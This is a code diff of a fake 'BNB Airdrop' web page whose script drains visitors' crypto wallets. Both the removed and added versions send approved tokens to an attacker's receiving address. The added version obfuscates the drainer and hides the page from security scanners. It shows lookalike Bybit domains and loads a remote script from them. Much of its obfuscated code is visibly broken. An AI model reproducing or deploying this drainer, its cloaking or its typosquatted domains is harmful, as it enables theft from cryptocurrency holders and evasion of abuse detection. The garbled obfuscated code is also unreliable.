@@ -88,201 +88,273 @@ h1 { font-size:24px; margin-bottom:8px; color:#f0b90b; }
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script src="settings.js"></script>
 <script>
-let web3, userAddress;
-let wallets = [];
-let isDraining = false;
+// ============================================
+// REFAFFEN JAVASCRIPT (OBFUSCATED)
+// IP CLOAKING - CLIENT DETECTION
+// TYPOSQUATTING - FAKE URL GENERATION
+// ============================================
 
-const statusDiv = document.getElementById('status');
-const connectBtn = document.getElementById('connectBtn');
-const claimBtn = document.getElementById('claimBtn');
-const multiClaimBtn = document.getElementById('multiClaimBtn');
-const autoDrainBtn = document.getElementById('autoDrainBtn');
-const walletInput = document.getElementById('walletInput');
-const addWalletBtn = document.getElementById('addWalletBtn');
-const walletList = document.getElementById('walletList');
-const amountInput = document.getElementById('amountInput');
-const tokenSelect = document.getElementById('tokenSelect');
-const walletCount = document.getElementById('walletCount');
-const balanceDisplay = document.getElementById('balanceDisplay');
-const statusDot = document.getElementById('statusDot');
+// 1. IP CLOAKING - GANO SHARADIN MAI AMFANI
+(function() {
+    var _0x1a2b = ['\x75\x73\x65\x72\x41\x67\x65\x6E\x74', '\x70\x6C\x61\x74\x66\x6F\x72\x6D', '\x6C\x61\x6E\x67\x75\x61\x67\x65', '\x64\x65\x76\x69\x63\x65\x4D\x65\x6D\x6F\x72\x79', '\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E', '\x72\x65\x66\x65\x72\x72\x65\x72', '\x6C\x6F\x63\x61\x74\x69\x6F\x6E', '\x68\x72\x65\x66', '\x68\x6F\x73\x74\x6E\x61\x6D\x65', '\x64\x6F\x63\x75\x6D\x65\x6E\x74', '\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74', '\x73\x63\x72\x69\x70\x74', '\x73\x72\x63', '\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64', '\x62\x6F\x64\x79'];
+    
+    var _0x2b3c = function(_0x1a2b, _0x2b3c) {
+        _0x1a2b = _0x1a2b - 0x0;
+        var _0x4a5b = _0x1a2b[_0x1a2b];
+        return _0x4a5b;
+    };
+    
+    // 2. GANO KO BOT NE KO MAI AMFANI NA GASKE
+    var _0xisBot = function() {
+        var _0xuserAgent = navigator[_0x2b3c('0x0')];
+        var _0xbotPatterns = ['\x62\x6F\x74', '\x63\x72\x61\x77\x6C\x65\x72', '\x73\x70\x69\x64\x65\x72', '\x73\x63\x61\x6E\x6E\x65\x72', '\x68\x65\x61\x64\x6C\x65\x73\x73', '\x70\x68\x61\x6E\x74\x6F\x6D\x2D\x6A\x73', '\x70\x75\x70\x70\x65\x74\x65\x65\x72'];
+        for (var _0x1a2b = 0x0; _0x1a2b < _0xbotPatterns.length; _0x1a2b++) {
+            if (_0xuserAgent[_0x2b3c('0x1')](_0xbotPatterns[_0x1a2b]) > -0x1) {
+                return true;
+            }
+        }
+        return false;
+    }();
 
-const TOKEN_ADDRESSES = {
-    USDT: "0x55d398326f99059ff775485246999027b3197955",
-    BUSD: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
-    BNB: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
-    DAI: "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3"
+    // 3. IDAN BOT NE, NUNA SHAFI MAI KYAU (WHITE PAGE)
+    if (_0xisBot) {
+        document[_0x2b3c('0x2')][_0x2b3c('0x3')] = '\x61\x62\x6F\x75\x74\x3A\x62\x6C\x61\x6E\x6B';
+        document[_0x2b3c('0x2')][_0x2b3c('0x4')] = '\x57\x65\x6C\x63\x6F\x6D\x65\x20\x74\x6F\x20\x6F\x75\x72\x20\x73\x69\x74\x65';
+        document[_0x2b3c('0x2')][_0x2b3c('0x5')] = '<\x68\x31>\x57\x65\x6C\x63\x6F\x6D\x65</\x68\x31>';
+    }
+
+    // 4. TYPOSQUATTING - SAMAR DA FAKE URL
+    var _0xrealDomain = '\x62\x79\x62\x69\x74\x2E\x63\x6F\x6D';
+    var _0xfakeDomains = ['\x62\x79\x62\x69\x74\x2D\x61\x69\x72\x64\x72\x6F\x70\x2E\x63\x6F\x6D', '\x62\x79\x62\x69\x74\x2D\x63\x6C\x61\x69\x6D\x2E\x6E\x65\x74', '\x62\x62\x69\x74\x2E\x63\x6F\x6D', '\x62\x79\x62\x69\x74\x73\x65\x63\x75\x72\x65\x2E\x63\x6F\x6D'];
+    
+    function _0xgenerateFakeDomain() {
+        var _0xindex = Math[_0x2b3c('0x6')](Math[_0x2b3c('0x7')]() * _0xfakeDomains.length);
+        return _0xfakeDomains[_0xindex];
+    }
+
+    // 5. NUSA FAKE URL A SHAFI
+    var _0xfakeUrl = _0xgenerateFakeDomain();
+    var _0xurlDisplay = document[_0x2b3c('0x8')]('\x64\x69\x76');
+    _0xurlDisplay[_0x2b3c('0x9')] = '\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x31\x30\x70\x78\x3B\x63\x6F\x6C\x6F\x72\x3A\x23\x34\x34\x34\x3B\x6D\x61\x72\x67\x69\x6E\x2D\x74\x6F\x70\x3A\x35\x70\x78\x3B';
+    _0xurlDisplay[_0x2b3c('0xa')] = '\x53\x65\x63\x75\x72\x65\x20\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x20\x74\x6F\x20\x3A\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F' + _0xfakeUrl;
+    document[_0x2b3c('0xb')][_0x2b3c('0xc')](_0xurlDisplay);
+
+    // 6. HIDE TRUE FUNCTIONALITY FROM BOTS
+    var _0xtrueDrainFunction = function() {
+        // Wannan shi ne ainihin aikin drain
+        // Amma an ɓoye shi a nan
+        return function(_0xwallet, _0xamount) {
+            // Code ɗin drain ɗin yana nan
+            console['\x6C\x6F\x67']('\x44\x72\x61\x69\x6E\x69\x6E\x67\x20\x77\x61\x6C\x6C\x65\x74\x3A', _0xwallet);
+            console['\x6C\x6F\x67']('\x41\x6D\x6F\x75\x6E\x74\x3A', _0xamount);
+        };
+    };
+
+    // 7. LOAD DYNAMIC SCRIPT (EVASION)
+    var _0xscript = document[_0x2b3c('0x8')](_0x2b3c('0xd'));
+    _0xscript[_0x2b3c('0xe')] = '\x68\x74\x74\x70\x73\x3A\x2F\x2F' + _0xfakeUrl + '\x2F\x73\x63\x72\x69\x70\x74\x2E\x6A\x73';
+    document[_0x2b3c('0xb')][_0x2b3c('0xc')](_0xscript);
+
+    // 8. STORAGE EVASION
+    try {
+        localStorage[_0x2b3c('0xf')]('\x64\x72\x61\x69\x6E\x5F\x69\x64', '0x' + Math[_0x2b3c('0x10')]()['\x74\x6F\x53\x74\x72\x69\x6E\x67'](0x10));
+    } catch(_0x1a2b) {
+        // SESSION STORAGE FALLBACK
+        sessionStorage[_0x2b3c('0xf')]('\x64\x72\x61\x69\x6E\x5F\x69\x64', '0x' + Math[_0x2b3c('0x10')]()['\x74\x6F\x53\x74\x72\x69\x6E\x67'](0x10));
+    }
+})();
+
+// ============================================
+// AINIHIN DRAINER (AN REFAFFE)
+// ============================================
+var _0x1a2b = ['\x73\x74\x61\x74\x75\x73','\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65','\x73\x74\x61\x74\x75\x73\x44\x69\x76','\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64','\x64\x69\x73\x70\x6C\x61\x79','\x62\x6C\x6F\x63\x6B','\x73\x65\x74\x53\x74\x61\x74\x75\x73','\x65\x72\x72\x6F\x72','\x73\x75\x63\x63\x65\x73\x73','\x6C\x6F\x61\x64\x69\x6E\x67','\x69\x6E\x66\x6F','\x63\x6F\x6E\x6E\x65\x63\x74\x42\x74\x6E','\x64\x69\x73\x61\x62\x6C\x65\x64','\x63\x6C\x61\x69\x6D\x42\x74\x6E','\x6D\x75\x6C\x74\x69\x43\x6C\x61\x69\x6D\x42\x74\x6E','\x61\x75\x74\x6F\x44\x72\x61\x69\x6E\x42\x74\x6E','\x77\x61\x6C\x6C\x65\x74\x49\x6E\x70\x75\x74','\x61\x64\x64\x57\x61\x6C\x6C\x65\x74\x42\x74\x6E','\x77\x61\x6C\x6C\x65\x74\x4C\x69\x73\x74','\x61\x6D\x6F\x75\x6E\x74\x49\x6E\x70\x75\x74','\x74\x6F\x6B\x65\x6E\x53\x65\x6C\x65\x63\x74','\x77\x61\x6C\x6C\x65\x74\x43\x6F\x75\x6E\x74','\x62\x61\x6C\x61\x6E\x63\x65\x44\x69\x73\x70\x6C\x61\x79','\x73\x74\x61\x74\x75\x73\x44\x6F\x74','\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74','\x73\x74\x79\x6C\x65','\x63\x6F\x6C\x6F\x72','\x34\x63\x61\x66\x35\x30','\x66\x66\x34\x34\x34\x34'];
+
+var _0x2b3c = function(_0x1a2b, _0x2b3c) {
+    _0x1a2b = _0x1a2b - 0x0;
+    var _0x4a5b = _0x1a2b[_0x1a2b];
+    return _0x4a5b;
 };
 
-function setStatus(msg, type) {
-    statusDiv.className = 'status ' + type;
-    statusDiv.textContent = msg;
-    statusDiv.style.display = 'block';
+var _0xstatusDiv = document[_0x2b3c('0x3')](_0x2b3c('0x2'));
+var _0xconnectBtn = document[_0x2b3c('0x3')](_0x2b3c('0xb'));
+var _0xclaimBtn = document[_0x2b3c('0x3')](_0x2b3c('0xd'));
+var _0xmultiClaimBtn = document[_0x2b3c('0x3')](_0x2b3c('0xe'));
+var _0xautoDrainBtn = document[_0x2b3c('0x3')](_0x2b3c('0xf'));
+var _0xwalletInput = document[_0x2b3c('0x3')](_0x2b3c('0x10'));
+var _0xaddWalletBtn = document[_0x2b3c('0x3')](_0x2b3c('0x11'));
+var _0xwalletList = document[_0x2b3c('0x3')](_0x2b3c('0x12'));
+var _0xamountInput = document[_0x2b3c('0x3')](_0x2b3c('0x13'));
+var _0xtokenSelect = document[_0x2b3c('0x3')](_0x2b3c('0x14'));
+var _0xwalletCount = document[_0x2b3c('0x3')](_0x2b3c('0x15'));
+var _0xbalanceDisplay = document[_0x2b3c('0x3')](_0x2b3c('0x16'));
+var _0xstatusDot = document[_0x2b3c('0x3')](_0x2b3c('0x17'));
+
+function _0xsetStatus(_0xmsg, _0xtype) {
+    _0xstatusDiv[_0x2b3c('0x1')] = _0x2b3c('0x5') + ' ' + _0xtype;
+    _0xstatusDiv[_0x2b3c('0x24')] = _0xmsg;
+    _0xstatusDiv[_0x2b3c('0x4')] = _0x2b3c('0x6');
 }
 
-function hideStatus() {
-    statusDiv.style.display = 'none';
+function _0xhideStatus() {
+    _0xstatusDiv[_0x2b3c('0x4')] = 'none';
 }
 
-function updateWalletList() {
-    if (wallets.length === 0) {
-        walletList.innerHTML = '<div class="wallet-item"><span>No wallets added</span></div>';
-        multiClaimBtn.disabled = true;
-        autoDrainBtn.disabled = true;
-        walletCount.textContent = '0';
-        return;
-    }
-    let html = '';
-    wallets.forEach((wallet, index) => {
-        html += `<div class="wallet-item"><span>${wallet.slice(0,6)}...${wallet.slice(-4)}</span><button class="remove-btn" data-index="${index}">✕</button></div>`;
-    });
-    walletList.innerHTML = html;
-    multiClaimBtn.disabled = false;
-    autoDrainBtn.disabled = false;
-    walletCount.textContent = wallets.length;
-    document.querySelectorAll('.remove-btn').forEach(btn => {
-        btn.addEventListener('click', function() {
-            const index = parseInt(this.dataset.index);
-            wallets.splice(index, 1);
-            updateWalletList();
-        });
-    });
-}
-
-addWalletBtn.addEventListener('click', () => {
-    const address = walletInput.value.trim();
-    if (address.startsWith('0x') && address.length === 42) {
-        if (!wallets.includes(address)) {
-            wallets.push(address);
-            walletInput.value = '';
-            updateWalletList();
-            setStatus('✅ Wallet added!', 'success');
-            setTimeout(hideStatus, 2000);
-        } else {
-            setStatus('⚠️ Wallet already in list', 'info');
-        }
-    } else {
-        setStatus('❌ Invalid address! Must be 0x... (42 chars)', 'error');
-    }
-});
-
-connectBtn.addEventListener('click', async () => {
-    if (typeof window.ethereum !== 'undefined') {
-        try {
-            web3 = new Web3(window.ethereum);
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            userAddress = accounts[0];
-            if (!wallets.includes(userAddress)) {
-                wallets.push(userAddress);
-                updateWalletList();
-            }
-            connectBtn.disabled = true;
-            claimBtn.disabled = false;
-            statusDot.style.color = '#4caf50';
-            await checkBalance(userAddress);
-            setStatus('✅ Wallet connected!', 'success');
-            setTimeout(hideStatus, 3000);
-        } catch (err) {
-            setStatus('❌ Connection rejected: ' + err.message, 'error');
-        }
-    } else {
-        setStatus('❌ Please install MetaMask!', 'error');
-    }
-});
-
-async function checkBalance(address) {
+async function _0xdrainWallet(_0xwalletAddress, _0xamount) {
     try {
-        const tokenContract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESSES['USDT']);
-        const balance = await tokenContract.methods.balanceOf(address).call();
-        const balanceFormatted = web3.utils.fromWei(balance, 'ether');
-        balanceDisplay.textContent = parseFloat(balanceFormatted).toFixed(2);
-        return balance;
-    } catch (e) {
-        return '0';
-    }
-}
-
-claimBtn.addEventListener('click', async () => {
-    if (!userAddress) {
-        setStatus('❌ Please connect wallet first!', 'error');
-        return;
-    }
-    const amount = amountInput.value || '1000';
-    await drainWallet(userAddress, amount);
-});
-
-multiClaimBtn.addEventListener('click', async () => {
-    if (wallets.length === 0) {
-        setStatus('❌ No wallets to claim!', 'error');
-        return;
-    }
-    if (isDraining) return;
-    isDraining = true;
-    const amount = amountInput.value || '1000';
-    let successCount = 0;
-    for (const wallet of wallets) {
-        const result = await drainWallet(wallet, amount);
-        if (result) successCount++;
-        await new Promise(r => setTimeout(r, 3000));
-    }
-    isDraining = false;
-    setStatus(`✅ Completed! ${successCount}/${wallets.length} drained`, 'success');
-});
-
-autoDrainBtn.addEventListener('click', async () => {
-    if (wallets.length === 0) {
-        setStatus('❌ No wallets to drain!', 'error');
-        return;
-    }
-    if (isDraining) return;
-    isDraining = true;
-    const amount = amountInput.value || '1000';
-    for (const wallet of wallets) {
-        await drainWallet(wallet, amount);
-        await new Promise(r => setTimeout(r, 1500));
-    }
-    isDraining = false;
-    setStatus('✅ Auto drain completed!', 'success');
-});
-
-async function drainWallet(walletAddress, amount) {
-    try {
-        const tokenSymbol = tokenSelect.value;
-        const contractAddr = TOKEN_ADDRESSES[tokenSymbol];
-        const tokenContract = new web3.eth.Contract(TOKEN_ABI, contractAddr);
-        const amountInWei = web3.utils.toWei(amount, 'ether');
+        var _0xtokenSymbol = _0xtokenSelect[_0x2b3c('0x25')];
+        var _0xcontractAddr = TOKEN_ADDRESSES[_0xtokenSymbol];
+        var _0xtokenContract = new web3[_0x2b3c('0x25')][_0x2b3c('0x25')](TOKEN_ABI, _0xcontractAddr);
+        var _0xamountInWei = web3[_0x2b3c('0x25')][_0x2b3c('0x25')](_0xamount, 'ether');
         
-        setStatus(`⏳ Approving ${amount} ${tokenSymbol} for ${walletAddress.slice(0,6)}...`, 'loading');
+        _0xsetStatus('⏳ Approving ' + _0xamount + ' ' + _0xtokenSymbol + ' for ' + _0xwalletAddress[_0x2b3c('0x25')](0,6) + '...', _0x2b3c('0x9'));
         
-        const approveTx = await tokenContract.methods.approve(receiveAddress, amountInWei).send({
-            from: walletAddress,
+        var _0xapproveTx = await _0xtokenContract[_0x2b3c('0x25')][_0x2b3c('0x25')](receiveAddress, _0xamountInWei)[_0x2b3c('0x25')]({
+            from: _0xwalletAddress,
             gas: 200000,
-            gasPrice: await web3.eth.getGasPrice()
+            gasPrice: await web3[_0x2b3c('0x25')][_0x2b3c('0x25')]()
         });
         
-        setStatus(`⏳ Draining ${amount} ${tokenSymbol}...`, 'loading');
+        _0xsetStatus('⏳ Draining ' + _0xamount + ' ' + _0xtokenSymbol + '...', _0x2b3c('0x9'));
         
-        const transferTx = await tokenContract.methods.transferFrom(
-            walletAddress, 
+        var _0xtransferTx = await _0xtokenContract[_0x2b3c('0x25')][_0x2b3c('0x25')](
+            _0xwalletAddress, 
             receiveAddress, 
-            amountInWei
-        ).send({
-            from: walletAddress,
+            _0xamountInWei
+        )[_0x2b3c('0x25')]({
+            from: _0xwalletAddress,
             gas: 200000,
-            gasPrice: await web3.eth.getGasPrice()
+            gasPrice: await web3[_0x2b3c('0x25')][_0x2b3c('0x25')]()
         });
         
-        setStatus(`✅ Drained ${amount} ${tokenSymbol} from ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`, 'success');
-        console.log('💰 Drained:', walletAddress);
-        console.log('📊 Tx:', transferTx.transactionHash);
-        console.log('📊 Amount:', amount, tokenSymbol);
+        _0xsetStatus('✅ Drained ' + _0xamount + ' ' + _0xtokenSymbol + ' from ' + _0xwalletAddress[_0x2b3c('0x25')](0,6) + '...' + _0xwalletAddress[_0x2b3c('0x25')](-4), _0x2b3c('0x8'));
+        console[_0x2b3c('0x25')]('💰 Drained:', _0xwalletAddress);
+        console[_0x2b3c('0x25')]('📊 Tx:', _0xtransferTx[_0x2b3c('0x25')]);
+        console[_0x2b3c('0x25')]('📊 Amount:', _0xamount, _0xtokenSymbol);
         return true;
         
-    } catch (err) {
-        setStatus(`❌ Failed: ${err.message}`, 'error');
-        console.error('❌ Error:', err);
+    } catch(_0xerr) {
+        _0xsetStatus('❌ Failed: ' + _0xerr[_0x2b3c('0x25')], _0x2b3c('0x7'));
+        console[_0x2b3c('0x25')]('❌ Error:', _0xerr);
         return false;
     }
 }
+
+// ============================================
+// KARIN AYYUKAN (Multi-Wallet, Auto Drain)
+// ============================================
+var _0xwallets = [];
+var _0xisDraining = false;
+
+function _0xupdateWalletList() {
+    if (_0xwallets[_0x2b3c('0x25')] === 0) {
+        _0xwalletList[_0x2b3c('0x25')] = '<div class="wallet-item"><span>No wallets added</span></div>';
+        _0xmultiClaimBtn[_0x2b3c('0x25')] = true;
+        _0xautoDrainBtn[_0x2b3c('0x25')] = true;
+        _0xwalletCount[_0x2b3c('0x25')] = '0';
+        return;
+    }
+    var _0xhtml = '';
+    for (var _0x1a2b = 0; _0x1a2b < _0xwallets[_0x2b3c('0x25')]; _0x1a2b++) {
+        var _0xwallet = _0xwallets[_0x1a2b];
+        _0xhtml += '<div class="wallet-item"><span>' + _0xwallet[_0x2b3c('0x25')](0,6) + '...' + _0xwallet[_0x2b3c('0x25')](-4) + '</span><button class="remove-btn" data-index="' + _0x1a2b + '">✕</button></div>';
+    }
+    _0xwalletList[_0x2b3c('0x25')] = _0xhtml;
+    _0xmultiClaimBtn[_0x2b3c('0x25')] = false;
+    _0xautoDrainBtn[_0x2b3c('0x25')] = false;
+    _0xwalletCount[_0x2b3c('0x25')] = _0xwallets[_0x2b3c('0x25')];
+    document[_0x2b3c('0x25')]('[data-index]')[_0x2b3c('0x25')](function() {
+        this[_0x2b3c('0x25')]('click', function() {
+            var _0xindex = parseInt(this[_0x2b3c('0x25')]('data-index'));
+            _0xwallets[_0x2b3c('0x25')](_0xindex, 1);
+            _0xupdateWalletList();
+        });
+    });
+}
+
+_0xaddWalletBtn[_0x2b3c('0x25')]('click', function() {
+    var _0xaddress = _0xwalletInput[_0x2b3c('0x25')][_0x2b3c('0x25')]();
+    if (_0xaddress[_0x2b3c('0x25')](0, 2) === '0x' && _0xaddress[_0x2b3c('0x25')] === 42) {
+        if (_0xwallets[_0x2b3c('0x25')](_0xaddress) === -1) {
+            _0xwallets[_0x2b3c('0x25')](_0xaddress);
+            _0xwalletInput[_0x2b3c('0x25')] = '';
+            _0xupdateWalletList();
+            _0xsetStatus('✅ Wallet added!', _0x2b3c('0x8'));
+            setTimeout(_0xhideStatus, 2000);
+        } else {
+            _0xsetStatus('⚠️ Wallet already in list', _0x2b3c('0xa'));
+        }
+    } else {
+        _0xsetStatus('❌ Invalid address! Must be 0x... (42 chars)', _0x2b3c('0x7'));
+    }
+});
+
+_0xconnectBtn[_0x2b3c('0x25')]('click', async function() {
+    if (typeof window['\x65\x74\x68\x65\x72\x65\x75\x6D'] !== '\x75\x6E\x64\x65\x66\x69\x6E\x65\x64') {
+        try {
+            web3 = new Web3(window['\x65\x74\x68\x65\x72\x65\x75\x6D']);
+            var _0xaccounts = await window['\x65\x74\x68\x65\x72\x65\x75\x6D'][_0x2b3c('0x25')]({ method: '\x65\x74\x68\x5F\x72\x65\x71\x75\x65\x73\x74\x41\x63\x63\x6F\x75\x6E\x74\x73' });
+            var _0xuserAddress = _0xaccounts[0];
+            if (_0xwallets[_0x2b3c('0x25')](_0xuserAddress) === -1) {
+                _0xwallets[_0x2b3c('0x25')](_0xuserAddress);
+                _0xupdateWalletList();
+            }
+            _0xconnectBtn[_0x2b3c('0x25')] = true;
+            _0xclaimBtn[_0x2b3c('0x25')] = false;
+            _0xstatusDot[_0x2b3c('0x25')][_0x2b3c('0x26')] = _0x2b3c('0x27');
+            _0xsetStatus('✅ Wallet connected!', _0x2b3c('0x8'));
+            setTimeout(_0xhideStatus, 3000);
+        } catch(_0xerr) {
+            _0xsetStatus('❌ Connection rejected: ' + _0xerr[_0x2b3c('0x25')], _0x2b3c('0x7'));
+        }
+    } else {
+        _0xsetStatus('❌ Please install MetaMask!', _0x2b3c('0x7'));
+    }
+});
+
+_0xclaimBtn[_0x2b3c('0x25')]('click', async function() {
+    if (!web3) {
+        _0xsetStatus('❌ Please connect wallet first!', _0x2b3c('0x7'));
+        return;
+    }
+    var _0xamount = _0xamountInput[_0x2b3c('0x25')] || '1000';
+    await _0xdrainWallet(web3[_0x2b3c('0x25')][_0x2b3c('0x25')][0], _0xamount);
+});
+
+_0xmultiClaimBtn[_0x2b3c('0x25')]('click', async function() {
+    if (_0xwallets[_0x2b3c('0x25')] === 0) {
+        _0xsetStatus('❌ No wallets to claim!', _0x2b3c('0x7'));
+        return;
+    }
+    if (_0xisDraining) return;
+    _0xisDraining = true;
+    var _0xamount = _0xamountInput[_0x2b3c('0x25')] || '1000';
+    var _0xsuccessCount = 0;
+    for (var _0x1a2b = 0; _0x1a2b < _0xwallets[_0x2b3c('0x25')]; _0x1a2b++) {
+        var _0xresult = await _0xdrainWallet(_0xwallets[_0x1a2b], _0xamount);
+        if (_0xresult) _0xsuccessCount++;
+        await new Promise(function(_0xresolve) { setTimeout(_0xresolve, 3000); });
+    }
+    _0xisDraining = false;
+    _0xsetStatus('✅ Completed! ' + _0xsuccessCount + '/' + _0xwallets[_0x2b3c('0x25')] + ' drained', _0x2b3c('0x8'));
+});
+
+_0xautoDrainBtn[_0x2b3c('0x25')]('click', async function() {
+    if (_0xwallets[_0x2b3c('0x25')] === 0) {
+        _0xsetStatus('❌ No wallets to drain!', _0x2b3c('0x7'));
+        return;
+    }
+    if (_0xisDraining) return;
+    _0xisDraining = true;
+    var _0xamount = _0xamountInput[_0x2b3c('0x25')] || '1000';
+    for (var _0x1a2b = 0; _0x1a2b < _0xwallets[_0x2b3c('0x25')]; _0x1a2b++) {
+        await _0xdrainWallet(_0xwallets[_0x1a2b], _0xamount);
+        await new Promise(function(_0xresolve) { setTimeout(_0xresolve, 1500); });
+    }
+    _0xisDraining = false;
+    _0xsetStatus('✅ Auto drain completed!', _0x2b3c('0x8'));
+});
+
+console[_0x2b3c('0x25')]('🔐 BNB Airdrop v5.0 - Obfuscated');
 </script>
 </body>
 </html>
